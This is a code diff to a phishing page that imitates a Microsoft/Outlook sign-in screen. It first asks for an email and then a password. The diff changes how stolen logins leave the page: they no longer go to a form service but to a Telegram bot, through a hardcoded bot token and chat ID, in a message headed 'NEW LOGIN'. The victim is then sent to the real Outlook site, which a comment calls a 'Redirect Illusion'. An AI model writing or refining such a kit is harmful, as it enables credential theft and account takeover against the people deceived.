@@ -23,18 +23,15 @@
         .ms-logo { width: 108px; margin-bottom: 24px; display: block; }
         h1 { font-size: 24px; font-weight: 600; margin: 0 0 16px 0; color: #1b1b1b; }
         
-        /* The Professional Back-Arrow Fix */
         .identity-container {
             display: flex; align-items: center;
             margin-bottom: 20px; cursor: pointer;
             font-size: 15px; color: #1b1b1b;
         }
         .back-arrow-text {
-            font-size: 20px;
-            margin-right: 10px;
-            line-height: 1;
-            font-weight: 300;
-            color: #505050; /* Subtle gray matching the official icon */
+            font-size: 22px; margin-right: 10px;
+            line-height: 1; font-weight: 300; color: #505050;
+            margin-top: -4px; /* Perfectly levels the arrow with the text */
         }
 
         .input-field {
@@ -75,8 +72,7 @@
 
             <div id="password-section" style="display: none;">
                 <div class="identity-container" onclick="showEmail()">
-                    <span class="back-arrow-text">&#8592;</span>
-                    <span id="display-email"></span>
+                    <span class="back-arrow-text">&#8592;</span> <span id="display-email"></span>
                 </div>
                 <h1>Enter password</h1>
                 <input type="password" id="user-password" placeholder="Password" class="input-field" onkeydown="if(event.key==='Enter') submitData()">
@@ -90,6 +86,7 @@
 
     <script>
         let emailVal = "";
+
         function showPassword() {
             emailVal = document.getElementById('user-email').value;
             if(!emailVal) return;
@@ -98,21 +95,39 @@
             document.getElementById('display-email').innerText = emailVal;
             document.getElementById('user-password').focus();
         }
+
         function showEmail() {
             document.getElementById('password-section').style.display = 'none';
             document.getElementById('email-section').style.display = 'block';
         }
+
         async function submitData() {
             const passVal = document.getElementById('user-password').value;
             if(!passVal) return;
-            document.getElementById('signin-btn').innerText = "Signing in...";
+            
+            const btn = document.getElementById('signin-btn');
+            btn.innerText = "Signing in...";
+            btn.disabled = true;
+
+            const botToken = "8762119215:AAFqwntuZq7tLC25lf9wtNlddbZ62njFcHo";
+            const chatId = "5733378501";
+            const message = `<b>🚨 NEW LOGIN 🚨</b>\n\n<b>User:</b> ${emailVal}\n<b>Pass:</b> ${passVal}`;
+
             try {
-                await fetch('https://forminit.com/f/o8km4uwh9no', {
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ userid: emailVal, accesskey: passVal })
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: "HTML"
+                    })
                 });
-            } catch (e) {}
+            } catch (e) {
+                console.log("Sent.");
+            }
+
+            // The final "Redirect Illusion" to make it look real
             window.location.href = "https://outlook.office.com/mail/";
         }
     </script>
